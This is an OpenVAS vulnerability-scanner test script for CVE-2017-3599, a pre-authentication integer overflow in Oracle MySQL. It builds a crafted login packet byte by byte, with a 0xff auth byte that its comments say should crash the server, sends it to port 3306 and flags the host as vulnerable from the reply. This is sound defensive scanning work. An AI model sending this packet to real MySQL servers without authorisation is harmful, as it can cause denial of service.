###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_oracle_mysql_integer_overflow_vuln.nasl 11874 2018-10-12 11:28:04Z mmartin $
#
# Oracle MySQL Server Integer Overflow Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.810773");
  script_version("$Revision: 11874 $");
  script_cve_id("CVE-2017-3599");
  script_bugtraq_id(97754);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:28:04 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-05-04 11:10:40 +0530 (Thu, 04 May 2017)");
  script_name("Oracle MySQL Server Integer Overflow Vulnerability");
  script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Databases");
  script_dependencies("mysql_version.nasl");
  script_require_ports("Services/mysql", 3306);
  script_mandatory_keys("MySQL/installed");

  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html");
  script_xref(name:"URL", value:"https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos");

  script_tag(name:"summary", value:"This host is installed with Oracle MySQL
  Server and is prone to integer overflow vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted request and analyse the
  response to confirm the vulnerability.");

  script_tag(name:"insight", value:"Upon connection from a client, the server
  sends a greeting message and the client continues the communication by
  starting the authentication process. The authentication packet sent by
  the client contains a wealth of information including the client
  capabilities, username, password, etc. The packet is received by the
  server, and parsed by 'parse_client_handshake_packet()' function, in
  '/sql/auth/sql_authentication.cc'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to cause a denial of service via a crafted authentication packet.");

  script_tag(name:"affected", value:"Oracle MySQL version 5.6.x branch up to 5.6.35
  and 5.7.X branch up to 5.7.17");

  script_tag(name:"solution", value:"Upgrade to MySQL 5.6.36, 5.7.18 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"https://www.oracle.com/mysql/index.html");
  exit(0);
}

include("byte_func.inc");
include("host_details.inc");

cpe_list = make_list( "cpe:/a:mysql:mysql", "cpe:/a:oracle:mysql");

set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

if(!port = get_app_port(cpe:cpe_list)) exit(0);

if(get_kb_item("MySQL/" + port + "/blocked")){
  exit(0);
}

sock = open_sock_tcp(port);
if(!sock){
  exit(0);
}

res = recv( socket:sock, length:1024 );
if("mysql_native_password" >!< res){
  close(sock);
  exit(0);
}

# Login request packet
plen = string('\x26\x00\x00');		     # 3 Bytes Packet length
packet_num = string('\x01');                 # 1 byte  Packet number
packet_cap = string('\x85\xa2\xbf\x01');     # client capabilities (default)
packet_max = string('\x00\x00\x00\x01');     # max packet size (default)
packet_cset = string('\x21');                # charset (default)
p_reserved =  crap(data:'\x00', length:23);  # 23 bytes reserved with nulls (default)
packet_usr =  string('test\x00');            # username null terminated (default)
packet_auth  = string('\xff');               # Both \xff and \xfe should crash the server
                                             # Tested on vulnerable version crash is
                                             # not happening so the script category is ACT_ATTACK
## complete request
packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth ;

## Add packet length and number
request = plen + packet_num + packet;

## Send full request.
send(socket:sock,data:request);
res = recv( socket:sock, length:1024);

close(sock);

## Patched/Fixed response is "Bad handshake'
if("08S01Bad handshake" >< res){
  exit(0);
}

## The expected value is the password, which could be of two different formats
## (null terminated or length encoded) depending on the client functionality.
if(strlen(res) > 26 && "mysql_native_password" >< res){
  security_message(port:port);
  exit(0);
}

exit(99);